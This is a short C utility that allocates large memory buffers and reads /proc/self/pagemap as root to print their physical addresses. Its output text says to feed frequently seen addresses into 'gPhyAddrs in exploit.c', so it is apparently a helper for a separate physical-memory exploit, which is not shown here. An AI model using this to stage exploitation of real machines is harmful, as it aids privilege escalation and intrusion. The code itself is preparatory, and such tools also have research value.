#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>

#define PAGE_SIZE 4096
#define PBUF_LEN (PAGE_SIZE * 4096) // 16 MB
#define NPBUFS 256

// Get physical address from /proc/self/pagemap (Requires Root)
uint64_t get_phys_addr(void *virt_addr) {
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) return 0;

    uint64_t virt_pfn = (uint64_t)virt_addr / PAGE_SIZE;
    off_t offset = virt_pfn * sizeof(uint64_t);
    uint64_t entry;

    if (pread(fd, &entry, sizeof(entry), offset) != sizeof(entry)) {
        close(fd);
        return 0;
    }
    close(fd);

    if (!(entry & (1ULL << 63))) return 0; // Page not present

    uint64_t phys_pfn = entry & ((1ULL << 55) - 1);
    return phys_pfn * PAGE_SIZE;
}

int main() {
    printf("[-] Allocating %d buffers of %d MB each...\n", NPBUFS, PBUF_LEN / 1024 / 1024);
    
    void *pbufs[NPBUFS];
    int success_count = 0;

    for (int i = 0; i < NPBUFS; i++) {
        pbufs[i] = mmap(NULL, PBUF_LEN, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (pbufs[i] == MAP_FAILED) {
            perror("mmap");
            continue;
        }
        
        // Touch memory to force allocation
        memset(pbufs[i], 0x41, PAGE_SIZE); 
        
        uint64_t phys = get_phys_addr(pbufs[i]);
        if (phys != 0) {
            printf("Buffer %d: VA %p -> PA 0x%lx\n", i, pbufs[i], phys);
            success_count++;
        }
    }

    if (success_count == 0) {
        printf("[-] Failed to get physical addresses. Are you running as ROOT?\n");
    } else {
        printf("[+] Analyze the output above. Look for addresses that appear in the list.\n");
        printf("[+] Pick a few high-frequency addresses and add them to gPhyAddrs in exploit.c\n");
    }
    
    return 0;
}
